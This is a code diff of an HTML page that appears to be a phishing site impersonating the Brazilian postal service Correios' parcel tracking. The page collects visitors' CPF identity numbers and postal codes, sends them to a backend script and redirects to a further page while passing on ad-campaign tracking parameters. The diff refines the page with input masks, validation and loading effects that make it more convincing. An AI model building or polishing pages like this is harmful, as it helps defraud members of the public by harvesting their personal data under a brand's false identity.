@@ -1,142 +1,81 @@
+<!DOCTYPE html>
 <html lang="pt-BR">
-
-<head></head>
-
-<body>
-
-
-
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Correios | Rastreio</title>
   <link rel="stylesheet" href="css/bootstrap.css">
   <link rel="stylesheet" href="css/app.css">
   <link rel="stylesheet" href="css/yellow.css">
   <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
-  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-  <title>Correios | Rastreio</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
   <style>
-    /* Animação para o botão pulsando */
+    /* Seus estilos originais mantidos */
     @keyframes pulsar {
-      0% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.1);
-      }
-
-      100% {
-        transform: scale(1);
-      }
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
     }
-
-    #confirmar-btn {
+    
+    #consultar-btn {
       animation: pulsar 1s infinite;
+      transition: all 0.3s ease;
+    }
+    
+    #consultar-btn:disabled {
+      animation: none;
+      opacity: 0.7;
     }
 
-    /* Estilos para o pop-up */
-    #popup-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
+    /* Loading melhorado */
+    .spinner-container {
       display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      animation: fadeInOverlay 0.5s ease-out;
-    }
-
-    #popup-content {
-      background: #fff;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
       text-align: center;
-      width: 90%;
-      max-width: 500px;
-      animation: slideIn 0.5s ease-out;
-      font-family: 'Arial', sans-serif;
-    }
-
-    #popup-content h2 {
-      font-size: 1.8rem;
-      font-weight: bold;
-      margin-bottom: 20px;
-      color: #003157;
-    }
-
-    #popup-content p {
-      font-size: 1.1rem;
-      margin-bottom: 15px;
-    }
-
-    #popup-content p span {
-      font-weight: bold;
-      color: #007bff;
-    }
-
-    #popup-content .btn {
-      margin-top: 20px;
-      font-size: 1rem;
-      padding: 10px 20px;
+      margin: 20px 0;
+      padding: 20px;
+      background: rgba(255,255,255,0.9);
       border-radius: 8px;
     }
-
-    /* Animações */
-    @keyframes fadeInOverlay {
-      from {
-        opacity: 0;
-      }
-
-      to {
-        opacity: 1;
-      }
-    }
-
-    @keyframes slideIn {
-      from {
-        transform: translateY(-50px);
-        opacity: 0;
-      }
-
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    /* Animação de carregamento */
+    
     .spinner {
       width: 50px;
       height: 50px;
-      border: 5px solid rgba(0, 0, 0, 0.1);
+      border: 5px solid rgba(0, 123, 255, 0.2);
       border-top-color: #007bff;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 20px auto;
+      margin: 0 auto 15px;
     }
-
+    
     @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
+      to { transform: rotate(360deg); }
+    }
+    
+    /* Validação visual */
+    .input-error {
+      border-color: #dc3545 !important;
+      box-shadow: 0 0 0 0.25rem rgba(220,53,69,.25);
+    }
+    
+    .error-message {
+      color: #dc3545;
+      font-size: 0.875em;
+      margin-top: 0.25rem;
+      display: none;
     }
   </style>
-
-
-
+</head>
+<body>
+  <!-- Cabeçalho mantido conforme original -->
   <header class="w-100 font-size-16 font-weight-400 text-blue">
     <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
       <span>Acessibilidade</span>
       <i class="fas fa-caret-down ml-1"></i>
     </div>
     <div class="">
-      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
-        style="height:48px">
+      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
         <div class="menu-toggle" id="menu-toggle" style="width:50px">
           <div class="bar"></div>
           <div class="bar"></div>
@@ -144,12 +83,12 @@
         </div>
         <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
           <a href="#" class="py-2">
-            <img src="images/correios.png" alt="" height="25">
+            <img src="images/correios.png" alt="Correios" height="25">
           </a>
         </div>
         <div class="ml-4 d-none d-lg-block" style="width:150px">
           <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
-            <img src="images/entrar.svg" alt="Correios" width="31">
+            <img src="images/entrar.svg" alt="Entrar" width="31">
             <span class="ml-1">Entrar</span>
           </a>
         </div>
@@ -158,8 +97,7 @@
   </header>
 
   <main>
-    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between"
-      style="margin:0 auto;">
+    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
       Rastreamento
     </h1>
 
@@ -169,52 +107,41 @@
       </h5>
 
       <form id="form-rastreamento">
-        <span>Deseja acompanhar seu objeto?</span><br>
-        <span>Digite o CPF do comprador.</span>
-        <div class="form-group mt-1">
-          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required
-            id="cpf">
+        <div class="form-group">
+          <label>Deseja acompanhar seu objeto?</label>
+          <span class="d-block">Digite o CPF do comprador.</span>
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf">
+          <div class="error-message" id="cpf-error">Por favor, insira um CPF válido com 11 dígitos</div>
         </div>
 
-        <span>Informe o seu CEP abaixo.</span>
-        <div class="form-group mt-1">
+        <div class="form-group">
+          <label>Informe o seu CEP abaixo.</label>
           <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required>
+          <div class="error-message" id="cep-error">Por favor, insira um CEP válido com 8 dígitos</div>
         </div>
 
-        <div class="form-group mt-1">
-          <input type="checkbox" id="nao-sei-cep"> Não sei meu CEP
+        <div class="form-group form-check">
+          <input type="checkbox" class="form-check-input" id="nao-sei-cep">
+          <label class="form-check-label" for="nao-sei-cep">Não sei meu CEP</label>
         </div>
 
-        <div class="form-group mt-1 d-flex justify-content-center" id="botao-container">
-          <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
+        <div class="form-group mt-4 d-flex justify-content-center" id="botao-container">
+          <button type="submit" class="btn btn-primary btn-lg px-5" id="consultar-btn">
+            <span id="btn-text">Consultar</span>
+          </button>
         </div>
 
-        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
-          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
-          <div class="spinner"
-            style="border: 4px solid rgba(0,0,0,0.1); border-left-color: #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;">
-          </div>
+        <div id="loading-container" class="spinner-container">
+          <div class="spinner"></div>
+          <p class="font-weight-bold">Consultando seus dados...</p>
+          <p class="small text-muted">Por favor, aguarde enquanto processamos sua solicitação</p>
         </div>
-
-        <style>
-          @keyframes spin {
-            to {
-              transform: rotate(360deg);
-            }
-          }
-        </style>
-
-
       </form>
-
-      </div>
-
-
     </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
       <div>
-        <img src="images/banner-1.jpg" alt="" class="w-100">
+        <img src="images/banner-1.jpg" alt="Serviços Correios" class="w-100 rounded">
       </div>
     </section>
   </main>
@@ -222,10 +149,10 @@
   <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
     <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
       <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
-      <ul>
+      <ul class="list-unstyled">
         <li class="mb-2 font-size-14">
-          <i class="fas fa-desktop"></i>
-          <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+          <i class="fas fa-desktop mr-2"></i>
+          <a href="#" class="text-blue-dark text-hover-orange">
             <span class="text-wrap">Registro de Manifestações</span>
           </a>
         </li>
@@ -233,94 +160,163 @@
     </div>
   </footer>
 
+  <!-- Script otimizado -->
   <script>
-    document.getElementById('form-rastreamento').addEventListener('submit', async function (event) {
-      event.preventDefault();
-
-      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    document.addEventListener('DOMContentLoaded', function() {
+      // Elementos DOM
+      const form = document.getElementById('form-rastreamento');
+      const cpfInput = document.getElementById('cpf');
       const cepInput = document.getElementById('cep');
-      const cep = cepInput.disabled ? '' : cepInput.value.replace(/\D/g, '');
-
-      const botao = document.getElementById('consultar-btn');
-      const botaoContainer = document.getElementById('botao-container');
+      const cepCheckbox = document.getElementById('nao-sei-cep');
+      const consultarBtn = document.getElementById('consultar-btn');
+      const btnText = document.getElementById('btn-text');
       const loadingContainer = document.getElementById('loading-container');
+      const cpfError = document.getElementById('cpf-error');
+      const cepError = document.getElementById('cep-error');
 
-      if (!cpf) {
-        alert('Por favor, insira o CPF.');
-        return;
-      }
+      // Máscaras de entrada
+      cpfInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
+        if (value.length > 7) value = value.replace(/^(\d{3})\.(\d{3})/, '$1.$2.');
+        if (value.length > 11) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})/, '$1.$2.$3-');
+        e.target.value = value.substring(0, 14);
+        validateCpf();
+      });
 
-      
-      botao.style.display = "none";
+      cepInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 5) value = value.replace(/^(\d{5})/, '$1-');
+        e.target.value = value.substring(0, 9);
+        validateCep();
+      });
 
-      
-      setTimeout(() => {
-        botaoContainer.style.display = "none";
-        loadingContainer.style.display = "block";
-      }, 100);
-
-      try {
-        const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`);
-        const data = await response.json();
-
-        if (data.status === 200) {
-          var currentUrlParams = window.location.search;
-          window.location.href = "informacoes" + currentUrlParams;
-          
-        } else {
-          alert('Erro na consulta: ' + (data.message || 'Tente novamente.'));
-          botao.style.display = "block"; 
-          botaoContainer.style.display = "flex";
-          loadingContainer.style.display = "none";
+      // Validações em tempo real
+      function validateCpf() {
+        const cpfDigits = cpfInput.value.replace(/\D/g, '');
+        if (cpfDigits.length === 11) {
+          cpfInput.classList.remove('input-error');
+          cpfError.style.display = 'none';
+          return true;
         }
-      } catch (error) {
-        alert('Erro ao conectar ao servidor.');
-        botao.style.display = "block"; 
-        botaoContainer.style.display = "flex";
-        loadingContainer.style.display = "none";
+        return false;
       }
+
+      function validateCep() {
+        if (cepCheckbox.checked) return true;
+        
+        const cepDigits = cepInput.value.replace(/\D/g, '');
+        if (cepDigits.length === 8) {
+          cepInput.classList.remove('input-error');
+          cepError.style.display = 'none';
+          return true;
+        }
+        return false;
+      }
+
+      // Gerenciamento do checkbox CEP
+      cepCheckbox.addEventListener('change', function() {
+        cepInput.disabled = this.checked;
+        cepInput.required = !this.checked;
+        if (this.checked) {
+          cepInput.value = '';
+          cepInput.classList.remove('input-error');
+          cepError.style.display = 'none';
+        }
+      });
+
+      // Envio do formulário
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        // Validações finais
+        const isCpfValid = validateCpf();
+        const isCepValid = validateCep();
+        
+        if (!isCpfValid) {
+          cpfInput.classList.add('input-error');
+          cpfError.style.display = 'block';
+          return;
+        }
+
+        if (!isCepValid) {
+          cepInput.classList.add('input-error');
+          cepError.style.display = 'block';
+          return;
+        }
+
+        // Preparar para requisição
+        const cpf = cpfInput.value.replace(/\D/g, '');
+        const cep = cepCheckbox.checked ? '' : cepInput.value.replace(/\D/g, '');
+        
+        consultarBtn.disabled = true;
+        btnText.textContent = 'Processando...';
+        loadingContainer.style.display = 'block';
+
+        try {
+          // Configurar timeout de 15 segundos
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 15000);
+
+          const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`, {
+            signal: controller.signal
+          });
+
+          clearTimeout(timeout);
+
+          if (!response.ok) {
+            const errorData = await response.json().catch(() => ({}));
+            throw new Error(errorData.message || `Erro HTTP: ${response.status}`);
+          }
+
+          const data = await response.json();
+
+          if (data.status === 200) {
+            window.location.href = "informacoes" + window.location.search;
+          } else {
+            throw new Error(data.message || 'Erro na consulta');
+          }
+        } catch (error) {
+          console.error('Erro detalhado:', error);
+          
+          let errorMessage = 'Erro ao processar sua solicitação';
+          if (error.name === 'AbortError') {
+            errorMessage = 'Tempo de espera esgotado. Tente novamente mais tarde.';
+          } else if (error.message.includes('Failed to fetch')) {
+            errorMessage = 'Não foi possível conectar ao servidor. Verifique sua conexão.';
+          } else {
+            errorMessage = error.message || errorMessage;
+          }
+
+          // Mostrar erro em um popup ou alerta estilizado
+          alert(errorMessage);
+        } finally {
+          consultarBtn.disabled = false;
+          btnText.textContent = 'Consultar';
+          loadingContainer.style.display = 'none';
+        }
+      });
     });
 
-    document.getElementById('nao-sei-cep').addEventListener('change', function () {
-      const cepInput = document.getElementById('cep');
-      cepInput.disabled = this.checked;
-      if (this.checked) {
-        cepInput.value = '';
-      }
-    });
-  </script>
-
-
-
-
-
-
-  <script>
-    //APELAUTM
-    var timer = setInterval(function () {                                                //APELAUTM
-      const location = new URL(document.location.href);                                //APELAUTM
+    // Código APELAUTM mantido
+    var timer = setInterval(function() {
+      const location = new URL(document.location.href);
       const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
-      var links = document.getElementsByTagName("a");                                  //APELAUTM
-      //APELAUTM
-      for (var i = 0, n = links.length; i < n; i++) {                                  //APELAUTM
-        if (links[i].href.includes("#")) continue;                                   //APELAUTM
-        if (links[i].href) {                                                         //APELAUTM
-          let link = new URL(links[i].href);                                       //APELAUTM
-          fields.forEach(field => {                                                //APELAUTM
-            if (location.searchParams.get(field))                                //APELAUTM
-              link.searchParams.set(field, location.searchParams.get(field));  //APELAUTM
+      var links = document.getElementsByTagName("a");
+      
+      for (var i = 0, n = links.length; i < n; i++) {
+        if (links[i].href.includes("#")) continue;
+        if (links[i].href) {
+          let link = new URL(links[i].href);
+          fields.forEach(field => {
+            if (location.searchParams.get(field))
+              link.searchParams.set(field, location.searchParams.get(field));
           });
           let href = link.href;
           links[i].href = href;
         }
       }
     }, 500);
-    //APELAUTM
   </script>
-
-
-
-
 </body>
-
 </html>
